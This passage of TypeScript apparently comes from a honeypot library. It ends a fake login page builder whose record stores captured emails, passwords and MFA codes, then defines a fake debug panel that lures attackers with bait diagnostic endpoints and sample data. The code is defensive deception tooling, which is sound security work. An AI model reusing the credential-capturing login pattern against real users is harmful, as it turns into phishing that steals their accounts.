        template,
        branding,
        submissionCount: 0,
        capturedCredentials: [] as Array<{ email: string; password: string; mfa?: string; timestamp: Date; ip: string }>,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeLoginPage.created');
    logger.info({ serviceId: service.id, companyName, framework }, 'Fake login page created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeLoginPage.error');
    logger.error(err, 'Failed to create fake login page');
    throw new SecurityError('FAKE_LOGIN_PAGE_FAILED', 'Failed to create fake login page');
  }
}

// ─── 20. fakeDebugPanel ─────────────────────────────────────────────────────

export interface FakeDebugConfig {
  title?: string;
  theme?: string;
  authRequired?: boolean;
}

export interface FakeDebugEndpoint {
  path: string;
  method?: string;
  description?: string;
}

/**
 * @description Creates a fake debug/admin panel with realistic diagnostic
 * endpoints and data to attract attackers looking for exposed debug interfaces.
 * @param config - Debug panel configuration
 * @param endpoints - Debug endpoint definitions
 * @param data - Sample diagnostic data to display
 * @returns FakeService representing the fake debug panel
 * @example
 * const debugPanel = await fakeDebugPanel(
 *   { title: 'Debug Console', theme: 'dark' },
 *   [{ path: '/debug/env', description: 'Environment variables' }],
 *   { env: { NODE_ENV: 'production' } }
 * );
 */
export async function fakeDebugPanel(
  config: FakeDebugConfig = {},
  endpoints: FakeDebugEndpoint[] = [],
  data: Record<string, unknown> = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeDebugPanel');
  const metrics = getMetrics();

  try {
    const title = config.title ?? 'Debug Console';
    const theme = config.theme ?? 'dark';
    const authRequired = config.authRequired ?? false;

    const defaultEndpoints: FakeDebugEndpoint[] = [
      { path: '/debug/env', method: 'GET', description: 'Environment variables' },
      { path: '/debug/config', method: 'GET', description: 'Application configuration' },
      { path: '/debug/health', method: 'GET', description: 'System health check' },
      { path: '/debug/metrics', method: 'GET', description: 'Performance metrics' },
      { path: '/debug/logs', method: 'GET', description: 'Application logs' },
      { path: '/debug/threads', method: 'GET', description: 'Thread dump' },
      { path: '/debug/memory', method: 'GET', description: 'Memory usage' },
      { path: '/debug/routes', method: 'GET', description: 'Registered routes' },
      { path: '/debug/cache', method: 'GET', description: 'Cache status' },
      { path: '/debug/db/pool', method: 'GET', description: 'Database connection pool' },
    ];

    const defaultData: Record<string, unknown> = {
      env: {
        NODE_ENV: 'production',
        NODE_VERSION: 'v20.10.0',
        HOSTNAME: 'api-prod-01',
        REGION: 'us-east-1',
        DEPLOY_VERSION: '2.1.0-build.4521',
      },
      health: {
        status: 'healthy',
        uptime: 86400 * 30,
        timestamp: new Date().toISOString(),
        checks: { database: 'ok', cache: 'ok', queue: 'ok', storage: 'ok' },
      },
      metrics: {
        requests_per_second: 1250,
        avg_response_time_ms: 45,
        error_rate: 0.02,
        active_connections: 342,
        cpu_usage: 67.3,
        memory_usage_mb: 2048,
      },
      db: {
        pool: { active: 15, idle: 5, waiting: 0, max: 20 },
        queries_per_second: 850,
        slow_queries: 3,
      },
      cache: {
        hit_rate: 0.94,
        keys: 125000,
        memory_mb: 512,
        evictions: 42,
      },
    };

    const mergedEndpoints = [...defaultEndpoints, ...endpoints];
    const mergedData = { ...defaultData, ...data };

    const service: FakeService = {
      id: generateId('debug'),
      type: 'fake-debug-panel',
      port: randomPort(9000, 9999),
      host: '0.0.0.0',
      status: 'running',
      config: {
        title,
        theme,
        authRequired,
        endpoints: mergedEndpoints,
        data: mergedData,
        refreshInterval: 5000,
        maxLogEntries: 1000,
      },
      metadata: {
        endpointCount: mergedEndpoints.length,
        dataKeys: Object.keys(mergedData),
        accessCount: 0,
        lastAccessed: null as Date | null,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeDebugPanel.created');
    logger.info({ serviceId: service.id, title, endpointCount: mergedEndpoints.length }, 'Fake debug panel created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeDebugPanel.error');
    logger.error(err, 'Failed to create fake debug panel');
    throw new SecurityError('FAKE_DEBUG_PANEL_FAILED', 'Failed to create fake debug panel');
  }
}
